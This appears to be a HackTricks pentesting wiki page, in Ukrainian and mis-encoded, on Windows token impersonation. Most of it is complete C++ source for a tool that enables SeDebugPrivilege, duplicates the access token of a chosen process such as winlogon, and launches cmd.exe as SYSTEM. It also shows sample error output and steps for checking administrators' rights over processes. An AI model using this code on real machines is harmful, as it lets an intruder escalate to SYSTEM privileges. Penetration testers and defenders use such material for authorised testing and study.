<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ **—Ä–µ–∫–ª–∞–º—É –≤–∞—à–æ—ó –∫–æ–º–ø–∞–Ω—ñ—ó –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub**.

</details>


## –ö–æ–¥

–ù–∞–≤–µ–¥–µ–Ω–∏–π –∫–æ–¥ –∑ [—Ü—å–æ–≥–æ –¥–∂–µ—Ä–µ–ª–∞](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). –í—ñ–Ω –¥–æ–∑–≤–æ–ª—è—î **–≤–∫–∞–∑–∞—Ç–∏ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—É —è–∫ –∞—Ä–≥—É–º–µ–Ω—Ç** —ñ –≤–∏–∫–æ–Ω–∞—Ç–∏ CMD **–≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è —è–∫ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á** –≤–∫–∞–∑–∞–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É.\
–í–∏–∫–æ–Ω—É—é—á–∏ –≤ –ø—Ä–æ—Ü–µ—Å—ñ –≤–∏—Å–æ–∫–æ—ó —Ü—ñ–Ω–Ω–æ—Å—Ç—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–∫–∞–∑–∞—Ç–∏ PID –ø—Ä–æ—Ü–µ—Å—É, —â–æ –ø—Ä–∞—Ü—é—î —è–∫ —Å–∏—Å—Ç–µ–º–∞** (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, winlogon, wininit) —Ç–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ cmd.exe —è–∫ —Å–∏—Å—Ç–µ–º–∞.
```cpp
impersonateuser.exe 1234
```
{% code title="impersonateuser.cpp" %}
```cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
{% endcode %}

## –ü–æ–º–∏–ª–∫–∞

–£ –¥–µ—è–∫–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —ñ–º–ø–µ—Ä—Å–æ–Ω–∞–ª—ñ–∑–∞—Ü—ñ—é System, —ñ —Ü–µ –Ω–µ —Å–ø—Ä–∞—Ü—é—î, –ø–æ–∫–∞–∑—É—é—á–∏ –≤–∏–≤—ñ–¥, –ø–æ–¥—ñ–±–Ω–∏–π –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
–¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–∏ –ø—Ä–∞—Ü—é—î—Ç–µ –Ω–∞ —Ä—ñ–≤–Ω—ñ –≤–∏—Å–æ–∫–æ—ó —ñ–Ω—Ç–µ–≥—Ä–∞–ª—å–Ω–æ—Å—Ç—ñ **–≤ –≤–∞—Å –Ω–µ–¥–æ—Å—Ç–∞—Ç–Ω—å–æ –¥–æ–∑–≤–æ–ª—ñ–≤**.\
–î–∞–≤–∞–π—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏–º–æ –ø–æ—Ç–æ—á–Ω—ñ –¥–æ–∑–≤–æ–ª–∏ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –¥–ª—è –ø—Ä–æ—Ü–µ—Å—ñ–≤ `svchost.exe` –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **–ø—Ä–æ–≤—ñ–¥–Ω–∏–∫–∞ –ø—Ä–æ—Ü–µ—Å—ñ–≤** (–∞–±–æ –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ Process Hacker):

1. –í–∏–±–µ—Ä—ñ—Ç—å –ø—Ä–æ—Ü–µ—Å `svchost.exe`
2. –ö–ª–∞—Ü–Ω—ñ—Ç—å –ø—Ä–∞–≤–æ—é –∫–Ω–æ–ø–∫–æ—é –º–∏—à—ñ --> –í–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ
3. –£ –≤–∫–ª–∞–¥—Ü—ñ "–ë–µ–∑–ø–µ–∫–∞" –∫–ª–∞—Ü–Ω—ñ—Ç—å —É –Ω–∏–∂–Ω—å–æ–º—É –ø—Ä–∞–≤–æ–º—É –∫—É—Ç—ñ –∫–Ω–æ–ø–∫—É "–î–æ–∑–≤–æ–ª–∏"
4. –ö–ª–∞—Ü–Ω—ñ—Ç—å "–î–æ–¥–∞—Ç–∫–æ–≤–æ"
5. –í–∏–±–µ—Ä—ñ—Ç—å "–ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∏" —ñ –∫–ª–∞—Ü–Ω—ñ—Ç—å "–†–µ–¥–∞–≥—É–≤–∞—Ç–∏"
6. –ö–ª–∞—Ü–Ω—ñ—Ç—å "–ü–æ–∫–∞–∑–∞—Ç–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω—ñ –¥–æ–∑–≤–æ–ª–∏"

![](<../../.gitbook/assets/image (322).png>)

–ü–æ–ø–µ—Ä–µ–¥–Ω—î –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è –º—ñ—Å—Ç–∏—Ç—å –≤—Å—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó, —è–∫—ñ "–ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∏" –º–∞—é—Ç—å —â–æ–¥–æ –≤–∏–±—Ä–∞–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É (—è–∫ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, —É –≤–∏–ø–∞–¥–∫—É `svchost.exe` –≤–æ–Ω–∏ –º–∞—é—Ç—å –ª–∏—à–µ –ø—Ä–∏–≤—ñ–ª–µ—ó "Query")

–ü–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ –ø—Ä–∏–≤—ñ–ª–µ—ó, —è–∫—ñ "–ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∏" –º–∞—é—Ç—å —â–æ–¥–æ `winlogon.exe`:

![](<../../.gitbook/assets/image (323).png>)

–£ —Ü—å–æ–º—É –ø—Ä–æ—Ü–µ—Å—ñ "–ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∏" –º–æ–∂—É—Ç—å "–ß–∏—Ç–∞—Ç–∏ –ø–∞–º'—è—Ç—å" —Ç–∞ "–ß–∏—Ç–∞—Ç–∏ –¥–æ–∑–≤–æ–ª–∏", —â–æ, –π–º–æ–≤—ñ—Ä–Ω–æ, –¥–æ–∑–≤–æ–ª—è—î –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º —ñ–º—ñ—Ç—É–≤–∞—Ç–∏ —Ç–æ–∫–µ–Ω, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —Ü–∏–º –ø—Ä–æ—Ü–µ—Å–æ–º.
